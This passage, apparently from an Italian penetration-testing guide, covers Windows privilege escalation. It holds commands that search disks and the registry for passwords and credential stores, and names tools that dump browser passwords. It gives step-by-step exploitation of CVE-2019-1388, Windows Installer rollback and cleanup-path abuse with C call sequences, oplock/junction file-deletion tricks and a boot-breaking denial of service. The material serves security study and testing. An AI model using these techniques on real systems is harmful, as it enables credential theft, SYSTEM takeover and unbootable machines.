%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

I database Password Safe v3 usano comunemente l'estensione `.psafe3`. Considera un nome file corrispondente come un possibile vault crittografato; la sua presenza non dimostra che tu possa leggerlo, sbloccarlo o usare le credenziali memorizzate. Quando verifichi dove sono archiviati questi file, controlla i profili utente accessibili e le radici di condivisione file configurate.

Anche un file KeePass `.kdbx` leggibile è solo un indizio della presenza di un vault crittografato. Per sbloccarlo servono la password principale effettiva e gli eventuali fattori configurati, come un key-file o un account. Se una verifica autorizzata individua una coppia di hash LM:NT in una voce, verifica l'account indicato e che l'hash NT sia aggiornato e accettato dal servizio NTLM di destinazione prima di valutare [pass-the-hash](../ntlm/README.md#pass-the-hash). Una voce nel vault non concede di per sé i diritti di Administrator o SYSTEM; devono essere disponibili anche l'accesso al servizio remoto, i diritti dell'account e qualsiasi passaggio separato di esecuzione del servizio. L'inventario dovrebbe riportare il percorso del vault e la sua leggibilità, senza stampare il database o le credenziali memorizzate.

Cerca tutti i file proposti:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Credenziali nel Cestino

Controlla le voci accessibili del Cestino alla ricerca di backup eliminati e archivi di configurazione, oltre che di file i cui nomi menzionano esplicitamente credenziali. Un backup `.7z`, `.zip` o `.rar` utile può avere mesi e un nome comune. Windows memorizza il percorso originale e l'ora di eliminazione in un record `$I` e il file eliminato nella relativa voce `$R`; esamina i metadati e verifica che l'identità corrente disponga dei permessi di lettura prima di aprire un archivio. La visibilità dipende dal volume, dal SID dell'utente e dai permessi dei file, quindi un elenco vuoto non dimostra che non esistano backup recuperabili. Considera il nome di un archivio come un elemento da esaminare, non come prova che contenga un segreto valido.

Anche un `.pfx` eliminato e accessibile può essere un indizio utile per la **firma del codice**. Se contiene una chiave privata accessibile, la chiave può firmare uno script PowerShell modificato; [PowerShell richiede un certificato di code-signing con una chiave privata](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature) e [le regole publisher di AppLocker valutano l'identità del firmatario e l'ambito della regola](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). L'esecuzione con un altro account richiede che l'identità corrente possa modificare lo script specifico, che una regola effettiva accetti la firma risultante per lo script e l'account di destinazione e che un'attività pianificata o un altro componente con privilegi maggiori lo esegua davvero. Il nome di un file `.pfx`, il soggetto del certificato o uno script scrivibile, da soli, non dimostrano che la catena sia completa. Esamina i metadati, gli ACL, i criteri e il comando pianificato prima di aprire materiale contenente chiavi private o attivare l'attività.

Esamina anche i database dei profili dei client di messaggistica accessibili, le note e i file ricevuti alla ricerca di indizi sulle credenziali. Un'esportazione della chiave di ripristino BitLocker può essere memorizzata in formato HTML o TXT, talvolta all'interno di un archivio di backup con un nome riconoscibile. Tale materiale può consentire l'accesso a un volume dati crittografato separato che contiene backup meno recenti; esamina il volume e l'archivio solo se sei autorizzato. Se un backup include `NTDS.dit`, il recupero offline delle credenziali di dominio richiede anche l'hive `SYSTEM` corrispondente, come descritto nel [flusso di lavoro per backup e gruppi privilegiati](../active-directory-methodology/privileged-groups-and-token-privileges.md). I nomi dei file e un volume bloccato, da soli, non dimostrano che esista una chiave di ripristino utilizzabile o un backup di dominio.

Per **recuperare le password** salvate da diversi programmi, puoi usare: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### All'interno del registro

**Altre possibili chiavi del registro contenenti credenziali**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Cronologia dei browser

Dovresti controllare la presenza dei database in cui sono archiviate le password di **Chrome, Edge o Firefox**.\
Controlla anche la cronologia, i segnalibri e i preferiti dei browser: potrebbero contenere **password**.

Per il profilo **Default** convenzionale di Edge dell'utente corrente, `Login Data` si trova in `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default`, mentre `Local State` si trova nella directory principale `User Data`. [Microsoft documenta il percorso predefinito del profilo](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); un altro profilo o un criterio `UserDataDir` può modificarlo. La presenza dei file è solo un indizio della possibile presenza di credenziali: verifica che i file siano leggibili, che sia disponibile il contesto DPAPI dell'utente interessato o altro materiale chiave autorizzato e che un eventuale login salvato appartenga a un account con privilegi più elevati. L'enumerazione dei soli percorsi non richiede di aprire il database né di stampare password decrittate.

Per Firefox, [Mozilla documenta](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile) che `key4.db` e `logins.json` di un profilo sono rispettivamente il file della chiave e quello dei login cifrati. La loro presenza è solo un indizio: verifica che entrambi i file siano leggibili, che esistano voci salvate e che una Primary Password non protegga la chiave prima di concludere che le credenziali siano utilizzabili. Se una credenziale recuperata appartiene a un account di dominio, verifica separatamente i diritti effettivi di controllo dei gruppi dell'account e i [diritti di lettura o decrittazione della password LAPS](../active-directory-methodology/laps.md) del gruppo; i soli artefatti del browser non dimostrano la possibilità di ottenere privilegi di amministratore.

Strumenti per estrarre password dai browser:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/GhostPack/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **Sovrascrittura di DLL COM**

Il **Component Object Model (COM)** è una tecnologia integrata nel sistema operativo Windows che consente la **comunicazione** tra componenti software scritti in linguaggi diversi. Ogni componente COM è **identificato da un class ID (CLSID)** e ciascun componente espone funzionalità tramite una o più interfacce, identificate da interface ID (IID).

Le classi e le interfacce COM sono definite nel registro, rispettivamente in **HKEY\CLASSES\ROOT\CLSID** e **HKEY\CLASSES\ROOT\Interface**. Questo registro viene creato unendo **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

All'interno dei CLSID di questo registro è possibile trovare la sottochiave **InProcServer32**, che contiene un **valore predefinito** che punta a una **DLL** e un valore chiamato **ThreadingModel**, che può essere **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single o Multi) oppure **Neutral** (Thread Neutral).

![Cronologia dei browser - Sovrascrittura di DLL COM: All'interno dei CLSID di questo registro è possibile trovare la sottochiave InProcServer32, che contiene un valore predefinito che punta a una DLL e un valore...](<../../images/image (729).png>)

In pratica, se riesci a **sovrascrivere una qualsiasi delle DLL** che verranno eseguite, potresti **escalare i privilegi** se quella DLL viene eseguita da un altro utente.

Per scoprire come gli attaccanti usano COM Hijacking come meccanismo di persistenza, consulta:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Ricerca generica di password nei file e nel registro**

**Cerca nei contenuti dei file**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Cerca un file con un determinato nome**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Cerca nel registro nomi di chiavi e password**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Strumenti per cercare password

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **è un plugin di msf** che ho creato per **eseguire automaticamente ogni modulo POST di metasploit che cerca credenziali** nel sistema vittima.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) cerca automaticamente tutti i file contenenti password menzionati in questa pagina.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) è un altro ottimo strumento per estrarre password da un sistema.

Lo strumento [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) cerca **sessioni**, **nomi utente** e **password** di diversi strumenti che salvano questi dati in chiaro (PuTTY, WinSCP, FileZilla, SuperPuTTY e RDP)

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Leaked Handlers

Immagina che **un processo in esecuzione come SYSTEM apra un nuovo processo** (`OpenProcess()`) con **accesso completo**. Lo stesso processo **crea anche un nuovo processo** (`CreateProcess()`) **con privilegi bassi, ma che eredita tutti gli handle aperti del processo principale**.\
Quindi, se hai **accesso completo al processo con privilegi bassi**, puoi recuperare l’**handle aperto del processo privilegiato** creato con `OpenProcess()` e **iniettare uno shellcode**.\
[Leggi questo esempio per saperne di più su **come rilevare e sfruttare questa vulnerabilità**.](leaked-handle-exploitation.md)\
[Leggi anche questo post per una spiegazione più completa su come verificare e abusare di altri handle aperti di processi e thread ereditati con diversi livelli di autorizzazione (non solo accesso completo)](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

I segmenti di memoria condivisa, chiamati **pipe**, consentono la comunicazione tra processi e il trasferimento dei dati.

Windows offre una funzionalità chiamata **Named Pipes**, che consente a processi non correlati di condividere dati, anche attraverso reti diverse. È simile a un’architettura client/server, con ruoli definiti come **named pipe server** e **named pipe client**.

Quando un **client** invia dati tramite una pipe, il **server** che l’ha configurata può **assumere l’identità** del **client**, se dispone dei necessari diritti **SeImpersonate**. Individuare un **processo privilegiato** che comunica tramite una pipe che puoi simulare offre l’opportunità di **ottenere privilegi più elevati**, assumendo l’identità di quel processo quando interagisce con la pipe che hai creato. Per le istruzioni su come eseguire questo attacco, consulta le guide disponibili [**qui**](named-pipe-client-impersonation.md) e [**qui**](#from-high-integrity-to-system).

Inoltre, il seguente strumento consente di **intercettare la comunicazione di una named pipe con uno strumento come Burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **e questo strumento consente di elencare e visualizzare tutte le pipe per individuare le privesc** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Il servizio Telephony (TapiSrv) in modalità server espone `\\pipe\\tapsrv` (MS-TRP). Un client remoto autenticato può abusare del percorso degli eventi asincroni basato su mailslot per trasformare `ClientAttach` in una **scrittura arbitraria di 4 byte** su qualsiasi file esistente scrivibile da `NETWORK SERVICE`, quindi ottenere i diritti di amministratore Telephony e caricare una DLL arbitraria come servizio. Flusso completo:

- `ClientAttach` con `pszDomainUser` impostato su un percorso esistente scrivibile → il servizio lo apre tramite `CreateFileW(..., OPEN_EXISTING)` e lo usa per le scritture degli eventi asincroni.
- Ogni evento scrive in quell’handle il valore `InitContext`, controllato dall’attaccante, proveniente da `Initialize`. Registra un’app line con `LRegisterRequestRecipient` (`Req_Func 61`), attiva `TRequestMakeCall` (`Req_Func 121`), recupera i dati tramite `GetAsyncEvents` (`Req_Func 0`), quindi annulla la registrazione/arresta il servizio per ripetere le scritture in modo deterministico.
- Aggiungiti a `[TapiAdministrators]` in `C:\Windows\TAPI\tsec.ini`, riconnettiti, quindi chiama `GetUIDllName` con il percorso di una DLL arbitraria per eseguire `TSPI_providerUIIdentify` come `NETWORK SERVICE`.

Maggiori dettagli:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Varie

### Estensioni di file che possono eseguire codice in Windows

Visita la pagina **[https://filesec.io/](https://filesec.io/)**

### Abuso di Protocol handler / ShellExecute tramite renderer Markdown

I link Markdown cliccabili inoltrati a `ShellExecuteExW` possono attivare URI handler pericolosi (`file:`, `ms-appinstaller:` o qualsiasi schema registrato) ed eseguire file controllati dall’attaccante come utente corrente. Vedi:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitoraggio delle righe di comando per individuare password**

Quando ottieni una shell come utente, potrebbero essere in esecuzione attività pianificate o altri processi che **passano credenziali nella riga di comando**. Lo script seguente acquisisce le righe di comando dei processi ogni due secondi, le confronta con lo stato precedente e mostra le eventuali differenze.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Rubare password dai processi

## Da utente con privilegi bassi a NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Se hai accesso all’interfaccia grafica (tramite console o RDP) e UAC è abilitato, in alcune versioni di Microsoft Windows è possibile eseguire un terminale o qualsiasi altro processo come "NT\AUTHORITY SYSTEM" da un utente non privilegiato.

Questo consente di aumentare i privilegi e aggirare UAC contemporaneamente, sfruttando la stessa vulnerabilità. Inoltre, non è necessario installare nulla e il binario usato durante il processo è firmato e distribuito da Microsoft.

Alcuni dei sistemi interessati sono i seguenti:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Per sfruttare questa vulnerabilità, è necessario eseguire i seguenti passaggi:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

You have all the necessary files and information in the following GitHub repository:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Da Medium a High Integrity Level come Administrator / UAC Bypass

Leggi questo per **saperne di più sugli Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Poi **leggi questo per saperne di più su UAC e sui bypass di UAC:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Junction di directory di upload in una root servita

Un'applicazione può creare una sottodirectory di upload prevedibile, scrivervi un nome file fornito dal chiamante e poi elaborare il file. Se un utente con privilegi limitati può rimuovere e sostituire quella sottodirectory con una junction NTFS prima della scrittura lato server, la scrittura potrebbe seguire la junction fino a una directory servita dal web server. Uno script inserito lì può essere eseguito con l'identità del servizio web, se il server esegue quel tipo di file. Si tratta di un confine di scrittura arbitraria specifico dell'applicazione; una directory di upload scrivibile o una junction già esistente, da sole, non lo dimostrano.

Controlla la costruzione esatta del percorso e i tempi di esecuzione nell'handler di upload, i diritti effettivi dell'utente per eliminare/creare la sottodirectory, le ACL effettive della destinazione, se il writer segue i reparse point e se il web server esegue file in quella destinazione. Verifica separatamente le identità dei processi del writer e del web server. L'inventario passivo può mostrare le ACL delle directory e i metadati dei reparse point, ma non può stabilire il comportamento dell'handler né un futuro scambio di junction. Se l'esecuzione avviene con un account di servizio, controlla l'**actual process token** prima di valutare un percorso separato basato sui token privilege.

## Da autorizzazioni arbitrarie di eliminazione/spostamento/rinomina di cartelle a SYSTEM EoP

La tecnica descritta [**in questo post del blog**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) con il codice di exploit [**disponibile qui**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

L'attacco consiste fondamentalmente nell'abusare della funzionalità di rollback di Windows Installer per sostituire file legittimi con file dannosi durante il processo di disinstallazione. A questo scopo, l'attaccante deve creare un **installer MSI dannoso** da usare per dirottare la cartella `C:\Config.Msi`, che verrà poi utilizzata da Windows Installer per archiviare i file di rollback durante la disinstallazione di altri pacchetti MSI; i file di rollback saranno stati modificati per contenere il payload dannoso.

### Iniezione del percorso di cleanup di Windows Installer COM (CVE-2025-27727)

Un client con privilegi limitati può raggiungere il servizio `msiexec.exe` SYSTEM tramite l'oggetto COM `CMsiConfigurationManager` (CLSID/IID `{000C101C-0000-0000-C000-000000000046}`). Il reverse engineering ha individuato le chiamate `IMsiServer` pertinenti: `MsiBeginTransactionW` all'offset vtable `0xA0`, `SetEEUIDirectoryAndFilter` a `0xC8` e `CleanupTempPackages` a `0x50`. Questi nomi e offset sono stati ricavati tramite reverse engineering e possono variare tra build.<sup>[[41]](#references)</sup>

Per un utente non amministratore, `SetEEUIDirectoryAndFilter` impersona il chiamante solo mentre apre il percorso fornito con `DELETE`, `FILE_FLAG_BACKUP_SEMANTICS` e `FILE_FLAG_OPEN_REPARSE_POINT`. Questo dimostra che il chiamante può eliminare la directory ed evita di seguire un reparse point, ma **non** associa l'oggetto file verificato al cleanup successivo né dimostra che sia stato creato da Windows Installer.<sup>[[41]](#references)</sup>

Dopo `MsiBeginTransactionW`, `SetEEUIDirectoryAndFilter` pianifica il percorso come cartella, indipendentemente dall'argomento filter del chiamante. Il servizio scrive un valore `REG_DWORD` con nome specificato sotto `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages`: il nome del valore è il percorso controllato dal chiamante e il dato `0x00000002` è il flag della cartella. `CleanupTempPackages(NULL, FALSE)` avvia quindi direttamente il cleanup. Il worker con privilegi elevati enumera i valori del registro e passa le voci delle cartelle alla funzione ricorsiva `FDeleteFolder` senza verificare la provenienza del percorso. Se la rimozione normale non riesce, il codice chiama anche `LockdownPath`, rimuove gli attributi dei file e riprova.<sup>[[41]](#references)</sup>

La sequenza minima di chiamate ricostruita da `msi.dll` è:<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

La primitiva utile è il riutilizzo del percorso, non il reindirizzamento tramite junction. Registra un `C:\Config.Msi` creato dall’attaccante, rimuovilo e lascia che Windows Installer ricrei in seguito lo stesso percorso con i dati di rollback protetti. La pulizia si fida del nome obsoleto `TempPackages` ed elimina la nuova directory come SYSTEM. Questo aggira il limite previsto da `FILE_FLAG_OPEN_REPARSE_POINT` e dalla mitigazione della fiducia nei reindirizzamenti, perché non è necessario alcun reparse point.<sup>[[41]](#references)</sup>

Questa primitiva di eliminazione si inserisce nella catena di rollback riportata sotto: conserva il record separato `Installer\Folders`, elimina il `C:\Config.Msi` protetto, ricrealo con una NULL DACL e mantieni un handle con autorizzazione `WRITE_DAC` aperto prima che l’installer renda più restrittiva la DACL. L’handle preaperto può ripristinare una DACL permissiva con `NtSetSecurityObject`, dopodiché è possibile sostituire il file `.rbs` generato prima che riprenda il rollback.<sup>[[41]](#references)</sup>

Microsoft ha corretto il problema impedendo a `CMsiTransaction::SetEEUIDirectoryAndFilter` di chiamare `ScheduleFileOrFolderDelete` quando è abilitato il nuovo feature gate. La chiamata COM può comunque restituire un esito positivo, ma il percorso controllato dall’attaccante non viene più inserito in `TempPackages`. Installa gli aggiornamenti di sicurezza di Windows di aprile 2025 anziché usare il successo del metodo come verifica della patch.<sup>[[41]](#references)[[42]](#references)</sup>

La tecnica, in sintesi, è la seguente:

1. **Fase 1 – Preparazione dell’hijack (lasciare `C:\Config.Msi` vuota)**

- Passaggio 1: installare l’MSI
    - Creare un `.msi` che installi un file innocuo (ad es. `dummy.txt`) in una cartella scrivibile (`TARGETDIR`).
    - Contrassegnare l’installer come **"UAC Compliant"**, così che possa essere eseguito da un **utente non amministratore**.
    - Mantenere aperto un **handle** del file dopo l’installazione.

- Passaggio 2: avviare la disinstallazione
    - Disinstallare lo stesso `.msi`.
    - Il processo di disinstallazione inizia a spostare i file in `C:\Config.Msi` e a rinominarli in file `.rbf` (backup di rollback).
    - **Monitorare l’handle del file aperto** con `GetFinalPathNameByHandle` per rilevare quando il file diventa `C:\Config.Msi\<random>.rbf`.

- Passaggio 3: sincronizzazione personalizzata
    - L’`.msi` include un’**azione di disinstallazione personalizzata (`SyncOnRbfWritten`)** che:
        - Segnala quando il file `.rbf` è stato scritto.
        - Poi **attende** un altro evento prima di proseguire con la disinstallazione.

- Passaggio 4: impedire l’eliminazione del file `.rbf`
    - Quando ricevi il segnale, **apri il file `.rbf`** senza `FILE_SHARE_DELETE` — così **ne impedisci l’eliminazione**.
    - Poi **invia un segnale** per consentire alla disinstallazione di terminare.
    - Windows Installer non riesce a eliminare il file `.rbf` e, non potendo eliminare tutti i contenuti, **non rimuove `C:\Config.Msi`**.

- Passaggio 5: eliminare manualmente il file `.rbf`
    - Tu (l’attaccante) elimini manualmente il file `.rbf`.
    - Ora **`C:\Config.Msi` è vuota**, pronta per essere dirottata.

> A questo punto, **attiva la vulnerabilità di eliminazione arbitraria di cartelle a livello SYSTEM** per eliminare `C:\Config.Msi`.

2. **Fase 2 – Sostituzione degli script di rollback con script malevoli**

- Passaggio 6: ricreare `C:\Config.Msi` con ACL deboli
    - Ricrea tu la cartella `C:\Config.Msi`.
    - Imposta **DACL deboli** (ad es. Everyone:F) e **mantieni aperto un handle** con `WRITE_DAC`.

- Passaggio 7: eseguire un’altra installazione
    - Installa nuovamente l’`.msi`, specificando:
        - `TARGETDIR`: un percorso scrivibile.
        - `ERROROUT`: una variabile che attiva un errore forzato.
    - Questa installazione servirà ad attivare nuovamente il **rollback**, che legge i file `.rbs` e `.rbf`.

- Passaggio 8: monitorare la comparsa di `.rbs`
    - Usa `ReadDirectoryChangesW` per monitorare `C:\Config.Msi` finché non compare un nuovo `.rbs`.
    - Acquisisci il nome del file.

- Passaggio 9: sincronizzarsi prima del rollback
    - L’`.msi` contiene un’**azione di installazione personalizzata (`SyncBeforeRollback`)** che:
        - Segnala un evento quando viene creato il file `.rbs`.
        - Poi **attende** prima di proseguire.

- Passaggio 10: riapplicare ACL deboli
    - Dopo aver ricevuto l’evento `.rbs created`:
        - Windows Installer **riapplica ACL restrittive** a `C:\Config.Msi`.
        - Ma, dato che hai ancora un handle con `WRITE_DAC`, puoi **riapplicare le ACL deboli**.

> Le ACL vengono **applicate solo all’apertura dell’handle**, quindi puoi ancora scrivere nella cartella.

- Passaggio 11: inserire i file `.rbs` e `.rbf` falsi
    - Sovrascrivi il file `.rbs` con uno **script di rollback falso** che indica a Windows di:
        - Ripristinare il tuo file `.rbf` (DLL malevola) in un **percorso privilegiato** (ad es. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
    - Inserisci il tuo file `.rbf` falso contenente una **DLL con payload malevolo a livello SYSTEM**.

- Passaggio 12: attivare il rollback
    - Segnala l’evento di sincronizzazione per far ripartire l’installer.
    - Un’**azione personalizzata di tipo 19 (`ErrorOut`)** è configurata per **far fallire intenzionalmente l’installazione** in un punto noto.
    - Questo avvia il **rollback**.

- Passaggio 13: SYSTEM installa la tua DLL
    - Windows Installer:
        - Legge il tuo `.rbs` malevolo.
        - Copia la tua DLL `.rbf` nel percorso di destinazione.
    - Ora hai la tua **DLL malevola in un percorso caricato da SYSTEM**.

- Passaggio finale: eseguire codice come SYSTEM
    - Esegui un **binario attendibile con elevazione automatica** (ad es. `osk.exe`) che carica la DLL dirottata.
    - **Boom**: il tuo codice viene eseguito **come SYSTEM**.


### Dall’eliminazione/spostamento/rinomina arbitraria di file all’EoP a livello SYSTEM

La tecnica principale di rollback MSI (quella precedente) presuppone che tu possa eliminare **un’intera cartella** (ad es. `C:\Config.Msi`). Ma cosa succede se la tua vulnerabilità consente solo **l’eliminazione arbitraria di file**?

Potresti sfruttare gli **interni di NTFS**: ogni cartella ha un flusso di dati alternativo nascosto chiamato:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

Questo stream memorizza i **metadati dell’indice** della cartella.

Quindi, se **elimini lo stream `::$INDEX_ALLOCATION`** di una cartella, NTFS **rimuove l’intera cartella** dal filesystem.

Puoi farlo usando le API standard per l’eliminazione dei file, come:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> Anche se stai chiamando un'API per eliminare un *file*, **viene eliminata la cartella stessa**.

### Dall'eliminazione del contenuto di una cartella all'EoP a SYSTEM
E se la tua primitive non ti permette di eliminare file/cartelle arbitrari, ma **consente di eliminare il *contenuto* di una cartella controllata dall'attaccante**?

1. Passaggio 1: prepara una cartella e un file esca
- Crea: `C:\temp\folder1`
- Al suo interno: `C:\temp\folder1\file1.txt`

2. Passaggio 2: imposta un **oplock** su `file1.txt`
- L'oplock **mette in pausa l'esecuzione** quando un processo con privilegi tenta di eliminare `file1.txt`.

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Step 3: Attivare il processo SYSTEM (ad es., `SilentCleanup`)
- Questo processo esegue la scansione delle cartelle (ad es., `%TEMP%`) e prova a eliminarne il contenuto.
- Quando raggiunge `file1.txt`, **l’oplock si attiva** e passa il controllo al tuo callback.

4. Step 4: All’interno del callback dell’oplock – reindirizzare l’eliminazione

- Option A: Spostare `file1.txt` altrove
    - Questo svuota `folder1` senza interrompere l’oplock.
    - Non eliminare direttamente `file1.txt`: così facendo, l’oplock verrebbe rilasciato prematuramente.

- Option B: Convertire `folder1` in una **junction**:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Opzione C: Crea un **symlink** in `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> Questo prende di mira lo stream interno di NTFS che memorizza i metadati della cartella: eliminarlo elimina la cartella.

5. Passaggio 5: Rilasciare l’oplock
- Il processo SYSTEM continua e tenta di eliminare `file1.txt`.
- Ma ora, a causa della junction + symlink, sta effettivamente eliminando:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**Risultato**: `C:\Config.Msi` viene eliminata da SYSTEM.

### Da creazione di una cartella arbitraria a DoS permanente

Sfrutta una primitive che consente di **creare una cartella arbitraria come SYSTEM/admin** — anche se **non puoi scrivere file** o **impostare permessi deboli**.

Crea una **cartella** (non un file) con il nome di un **driver Windows critico**, ad esempio:
```
C:\Windows\System32\cng.sys
```

- Questo percorso normalmente corrisponde al driver in modalità kernel `cng.sys`.
- Se **lo si crea in anticipo come cartella**, Windows non riesce a caricare il driver effettivo all’avvio.
- Quindi Windows prova a caricare `cng.sys` durante l’avvio.
- Rileva la cartella, **non riesce a individuare il driver effettivo** e **va in crash o blocca l’avvio**.
- Non c’è **alcun fallback** né **alcun ripristino** senza un intervento esterno (ad es. riparazione dell’avvio o accesso al disco).

### Da percorsi privilegiati per log/backup + symlink OM a sovrascrittura arbitraria di file / DoS all’avvio

Quando un **servizio privilegiato** scrive log/esportazioni in un percorso letto da una **configurazione scrivibile**, reindirizza quel percorso con **symlink Object Manager + mount point NTFS** per trasformare la scrittura privilegiata in una sovrascrittura arbitraria (anche **senza** SeCreateSymbolicLinkPrivilege).<sup>[[15]](#references)</sup>

**Requisiti**
- La configurazione che memorizza il percorso di destinazione è scrivibile dall’attaccante (ad es. `%ProgramData%\...\.ini`).
